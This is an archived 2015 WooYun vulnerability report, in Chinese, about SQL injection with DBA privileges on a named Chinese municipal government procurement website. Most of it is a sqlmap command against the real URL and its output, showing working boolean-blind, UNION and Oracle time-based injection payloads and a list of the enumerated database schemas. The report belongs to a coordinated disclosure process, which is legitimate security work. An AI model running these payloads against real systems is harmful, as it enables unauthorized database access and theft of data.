wybug_title: 某市政府采购网SQL注入一枚（DBA权限）
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-17：	细节已通知厂商并且等待厂商处理中									2015-07-21：	厂商已经确认，细节仅向厂商公开									2015-07-31：	细节向核心白帽子及相关领域专家公开									2015-08-10：	细节向普通白帽子公开									2015-08-20：	细节向实习白帽子公开									2015-09-06：	细节向公众公开  简要描述： 秦皇岛市政府采购网存在SQL注入，可导致信息泄露 详细说明：  
http://www.qhdzfcg.gov.cn/mylogon/product.do?method=proinfo&id=S8dskU5C-qfxVXxBb-kcLQg5WI-zQzV9lCY&csid=568&price=18888
参数id存在注入，DBA权限，涉及22个库sqlmap跑的：C:\Python27\sqlmap12>sqlmap.py -u "http://www.qhdzfcg.gov.cn/mylogon/product.do?method=proinfo&id=S8dskU5C-qfxVXxBb-kcLQg5WI-zQzV9lCY&csid=568&price=18888" -p id  --is-dba --current-db --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:09:31[13:09:31] [INFO] resuming back-end DBMS 'oracle'[13:09:31] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=proinfo&id=S8dskU5C-qfxVXxBb-kcLQg5WI-zQzV9lCY' AND 9199=9199 AND 'CvPE'='CvPE&csid=568&price=18888    Type: UNION query    Title: Generic UNION query (NULL) - 30 columns    Payload: method=proinfo&id=-7626' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(115)||CHR(113)||CHR(104)||CHR(113)||CHR(103)||CHR(76)||CHR(66)||CHR(66)||CHR(121)||CHR(116)||CHR(121)||CHR(72)||CHR(113)||CHR(69)||CHR(113)||CHR(114)||CHR(122)||CHR(118)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- &csid=568&price=18888    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: method=proinfo&id=S8dskU5C-qfxVXxBb-kcLQg5WI-zQzV9lCY' AND 1738=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(89)||CHR(118)||CHR(76),5) AND 'QYGO'='QYGO&csid=568&price=18888---[13:09:31] [INFO] the back-end DBMS is Oracleweb application technology: Servlet 2.4, Tomcat 4.0.2, JSPback-end DBMS: Oracle[13:09:32] [INFO] fetching current database[13:09:32] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SYSTEM'[13:09:32] [INFO] testing if current user is DBAcurrent user is DBA:    True[13:09:33] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[13:09:33] [INFO] fetching database (schema) names[13:09:34] [INFO] the SQL query used returns 22 entries[13:09:34] [INFO] retrieved: "CTXSYS"[13:09:35] [INFO] retrieved: "HR"[13:09:36] [INFO] retrieved: "MDSYS"[13:09:36] [INFO] retrieved: "ODM"[13:09:37] [INFO] retrieved: "ODM_MTR"[13:09:38] [INFO] retrieved: "OE"[13:09:38] [INFO] retrieved: "OLAPSYS"[13:09:39] [INFO] retrieved: "ORDSYS"[13:09:39] [INFO] retrieved: "OUTLN"[13:09:40] [INFO] retrieved: "PM"[13:09:40] [INFO] retrieved: "QS"[13:09:41] [INFO] retrieved: "QS_CBADM"[13:09:42] [INFO] retrieved: "QS_CS"[13:09:42] [INFO] retrieved: "QS_ES"[13:09:43] [INFO] retrieved: "QS_OS"[13:09:43] [INFO] retrieved: "QS_WS"[13:09:44] [INFO] retrieved: "SH"[13:09:45] [INFO] retrieved: "SYS"[13:09:45] [INFO] retrieved: "SYSTEM"[13:09:46] [INFO] retrieved: "WKSYS"[13:09:46] [INFO] retrieved: "WMSYS"[13:09:47] [INFO] retrieved: "XDB"available databases [22]:[*] CTXSYS[*] HR[*] MDSYS[*] ODM[*] ODM_MTR[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] QS[*] QS_CBADM[*] QS_CS[*] QS_ES[*] QS_OS[*] QS_WS[*] SH[*] SYS[*] SYSTEM[*] WKSYS[*] WMSYS[*] XDB   漏洞证明：  如上。   修复方案：  过滤。   版权声明：转载请注明来源 elevensec11@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-21 14:13 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给河北分中心，由河北分中心后续协调网站管理单位处置。 最新状态： 暂无
